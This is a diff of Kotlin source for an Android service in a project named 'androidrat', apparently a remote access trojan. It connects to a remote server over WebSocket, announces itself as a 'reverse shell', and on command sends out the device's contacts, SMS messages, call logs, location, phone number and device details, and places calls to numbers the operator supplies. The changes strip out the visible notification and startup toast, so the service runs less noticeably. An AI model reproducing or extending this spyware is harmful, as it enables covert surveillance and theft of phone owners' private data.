@@ -1,14 +1,9 @@
 package com.nqmgaming.androidrat.service
 
-import android.Manifest
 import android.annotation.SuppressLint
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.IBinder
@@ -16,25 +11,19 @@ import android.provider.CallLog
 import android.provider.Telephony
 import android.telephony.TelephonyManager
 import android.util.Log
-import android.widget.Toast
 import androidx.annotation.RequiresApi
-import androidx.core.content.ContextCompat
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
 import com.google.gson.Gson
-import com.nqmgaming.androidrat.R
 import com.nqmgaming.androidrat.command.Battery
 import com.nqmgaming.androidrat.command.DeviceInfo
 import com.nqmgaming.androidrat.command.IpAddress
 import com.nqmgaming.androidrat.command.Screenshot
+import com.nqmgaming.androidrat.command.geoLocation
 import com.nqmgaming.androidrat.core.util.Constant.IP_ADDRESS
 import com.nqmgaming.androidrat.core.util.Constant.PORT
 import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder.mediaProjectionData
 import com.nqmgaming.androidrat.data.dto.MessageDto
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.WebSocket
@@ -57,14 +46,6 @@ class WebSocketService : Service() {
     override fun onCreate() {
         super.onCreate()
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-
-        createNotificationChannel()
-        val notification: Notification = Notification.Builder(this, CHANNEL_ID)
-            .setContentTitle("WebSocket Service")
-            .setContentText("WebSocket Service is running")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
-            .build()
-
         // Khởi tạo WebSocket
         connectWebSocket()
 
@@ -77,7 +58,7 @@ class WebSocketService : Service() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 // Send Device Info
                 val message: String =
-                    "Hello there, welcome to reverse shell of ${Build.MODEL} \n" + help
+                    "Hello there, welcome to reverse shell of ${Build.MODEL} \n" + "${Build.ID} \n" + HELP_COMMAND
                 webSocket.send(message)
                 // Hủy Timer khi kết nối thành công
                 reconnectTimer?.cancel()
@@ -89,7 +70,7 @@ class WebSocketService : Service() {
             override fun onMessage(webSocket: WebSocket, text: String) {
                 println("Received text: $text")
                 lastCommandTime = System.currentTimeMillis()
-                if (text.contains(deviceId)) {
+                if (text.contains(Build.ID)) {
                     onGetCommand(text, webSocket)
                 }
 
@@ -99,7 +80,7 @@ class WebSocketService : Service() {
             override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                 val message = "Received bytes: ${bytes.utf8()}"
                 println(message)
-                if (message.contains(deviceId)) {
+                if (message.contains(Build.ID)) {
                     onGetCommand(bytes.utf8(), webSocket)
                 }
             }
@@ -109,7 +90,6 @@ class WebSocketService : Service() {
                 println("Closing: $code / $reason")
             }
 
-
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 // Bắt đầu Timer để thử kết nối lại sau mỗi 5 giây
                 scheduleReconnect()
@@ -118,7 +98,6 @@ class WebSocketService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Toast.makeText(this, "WebSocket Service started", Toast.LENGTH_SHORT).show()
         return START_STICKY
     }
 
@@ -127,20 +106,6 @@ class WebSocketService : Service() {
         restartServiceIntent.setPackage(packageName)
         startService(restartServiceIntent)
         super.onTaskRemoved(rootIntent)
-    }
-
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val name = "WebSocket Service Channel"
-            val descriptionText = "Channel for WebSocket Service"
-            val importance = NotificationManager.IMPORTANCE_DEFAULT
-            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
-                description = descriptionText
-            }
-            val notificationManager: NotificationManager =
-                getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-            notificationManager.createNotificationChannel(channel)
-        }
     }
 
     private fun scheduleReconnect() {
@@ -159,14 +124,9 @@ class WebSocketService : Service() {
         return null
     }
 
-//    override fun onDestroy() {
-//        super.onDestroy()
-//        webSocket.close(1000, null)
-//    }
 
     companion object {
-        const val CHANNEL_ID = "WebSocketServiceChannel"
-        const val help = "Available commands:\n" +
+        const val HELP_COMMAND = "Available commands:\n" +
                 "1. help - Display this help message\n" +
                 "2. info - Display device information\n" +
                 "3. location - Get device location\n" +
@@ -175,66 +135,23 @@ class WebSocketService : Service() {
                 "6. read_contacts - Read contacts\n" +
                 "7. read_sms - Read SMS\n" +
                 "8. read_call_logs - Read call logs\n" +
-                "9. call - Make a call\n" +
-                "10. sms - Send SMS\n" +
-                "11. read_clipboard - Read clipboard content\n" +
-                "12. take_picture - Take a picture\n" +
-                "13. take_screen - Take a screenshot (please don't run it require fore background)'\n" +
-                "14. battery - Get battery status\n" +
-                "15. network_info - Get network information\n" +
-                ". sleep - Put service to sleep\n"
+                "9. read_clipboard - Read clipboard content\n" +
+                "10. battery - Get battery status\n" +
+                "11. network_info - Get network information\n"
     }
-
     @RequiresApi(Build.VERSION_CODES.M)
     private fun onGetCommand(command: String, webSocket: WebSocket) {
         if (command.contains("help")) {
-            webSocket.send(help)
+            webSocket.send(HELP_COMMAND + Build.ID)
         } else if (command.contains("ping")) {
             webSocket.send("pong")
         } else if (command.contains("info")) {
             val info = DeviceInfo.getDeviceInfo()
             webSocket.send(info)
         } else if (command.contains("location")) {
-            CoroutineScope(Dispatchers.IO).launch {
-                // check if location permission is granted
-                if (ContextCompat.checkSelfPermission(
-                        applicationContext,
-                        Manifest.permission.ACCESS_FINE_LOCATION
-                    ) == PackageManager.PERMISSION_GRANTED
-                ) {
-                    withContext(Dispatchers.Main) {
-                        println("Location permission granted")
-                    }
-                } else {
-                    withContext(Dispatchers.Main) {
-                        println("Location permission not granted")
-                    }
-                    return@launch
-                }
-
-                fusedLocationClient.lastLocation.addOnSuccessListener { location ->
-                    if (location != null) {
-                        // Logic to handle location object
-                        try {
-                            val stringBuilder = StringBuilder()
-                            stringBuilder.append("{\n")
-                            stringBuilder.append("  \"latitude\": ${location.latitude},\n")
-                            stringBuilder.append("  \"longitude\": ${location.longitude},\n")
-                            stringBuilder.append("  \"accuracy\": ${location.accuracy},\n")
-                            stringBuilder.append("  \"altitude\": ${location.altitude},\n")
-                            stringBuilder.append("  \"speed\": ${location.speed},\n")
-                            stringBuilder.append("  \"time\": ${location.time},\n")
-                            stringBuilder.append("  \"provider\": \"${location.provider}\",\n")
-                            stringBuilder.append("  \"bearing\": ${location.bearing},\n")
-                            stringBuilder.append("  \"GoogleMap Link\": \"https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}\"\n")
-                            stringBuilder.append("}")
-                            webSocket.send(stringBuilder.toString())
-                        } catch (e: Exception) {
-                            e.printStackTrace()
-                        }
-                    }
-                }
-            }
+            val geoLocation = geoLocation(this)
+            val location = geoLocation.getLocation()
+            webSocket.send(location.toString())
         } else if (command.contains("phone_number")) {
             val telephoneManager =
                 getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
@@ -250,17 +167,24 @@ class WebSocketService : Service() {
                 null
             )
             while (cursor!!.moveToNext()) {
-                val name =
-                    cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
-                val number =
-                    cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
+                val nameIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
+                val numberIndex = cursor.getColumnIndex(Telephony.Sms.BODY)
+
+                val name = if (nameIndex != -1) cursor.getString(nameIndex) else null
+                val number = if (numberIndex != -1) cursor.getString(numberIndex) else null
+
                 contacts += "Name: $name\nNumber: $number\n\n"
             }
             cursor.close()
-            webSocket.send(contacts)
+            if (contacts.isEmpty()) {
+                contacts = "No contacts found"
+                webSocket.send(contacts)
+            } else {
+                webSocket.send(contacts)
+            }
         } else if (command.contains("read_sms")) {
             val cursor = contentResolver.query(
-                android.provider.Telephony.Sms.CONTENT_URI,
+                Telephony.Sms.CONTENT_URI,
                 null,
                 null,
                 null,
@@ -269,15 +193,17 @@ class WebSocketService : Service() {
 
             val messageList = mutableListOf<MessageDto>()
             while (cursor!!.moveToNext()) {
-                val id = cursor.getString(cursor.getColumnIndex(Telephony.Sms._ID))
-                val message =
-                    cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
-                val sender =
-                    cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
-                val receiver =
-                    cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.PERSON))
-                val date =
-                    cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE))
+                val idIndex = cursor.getColumnIndex(Telephony.Sms._ID)
+                val messageIndex = cursor.getColumnIndex(Telephony.Sms.BODY)
+                val senderIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
+                val receiverIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.PERSON)
+                val dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE)
+
+                val id = if (idIndex != -1) cursor.getString(idIndex) else null
+                val message = if (messageIndex != -1) cursor.getString(messageIndex) else null
+                val sender = if (senderIndex != -1) cursor.getString(senderIndex) else null
+                val receiver = if (receiverIndex != -1) cursor.getString(receiverIndex) else null
+                val date = if (dateIndex != -1) cursor.getString(dateIndex) else null
                 val messageDto =
                     MessageDto(id, message, date, deviceId, sender, receiver)
                 messageList.add(messageDto)
@@ -286,32 +212,42 @@ class WebSocketService : Service() {
 
             // convert messageList to JSON string
             val messageListJson = Gson().toJson(messageList)
-            webSocket.send(messageListJson)
+            if (messageListJson.isEmpty()) {
+                webSocket.send("No SMS found")
+            } else {
+                webSocket.send(messageListJson)
+            }
 
         } else if (command.contains("read_call_logs")) {
             var callLogs = ""
             val cursor = contentResolver.query(
-                android.provider.CallLog.Calls.CONTENT_URI,
+                CallLog.Calls.CONTENT_URI,
                 null,
                 null,
                 null,
                 null
             )
             while (cursor!!.moveToNext()) {
-                val number =
-                    cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
-                val name =
-                    cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
-                val status =
-                    cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))
-                val duration =
-                    cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))
+                val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
+                val nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                val statusIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
+                val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
+
+                val number = if (numberIndex != -1) cursor.getString(numberIndex) else null
+                val name = if (nameIndex != -1) cursor.getString(nameIndex) else null
+                val status = if (statusIndex != -1) cursor.getString(statusIndex) else null
+                val duration = if (durationIndex != -1) cursor.getString(durationIndex) else null
+
                 callLogs += "Name: $name\nNumber: $number\nStatus: $status\nDuration: $duration\n\n"
             }
             cursor.close()
+            if (callLogs.isEmpty()) {
+                callLogs = "No call logs found"
+            }
             webSocket.send(callLogs)
         } else if (command.contains("call")) {
-            val number = "+1234567890"
+            // get number from command format: call:1234567890
+            val number = command.split(":")[1]
             val intent = Intent(Intent.ACTION_CALL)
             intent.data = Uri.parse("tel:$number")
             startActivity(intent)
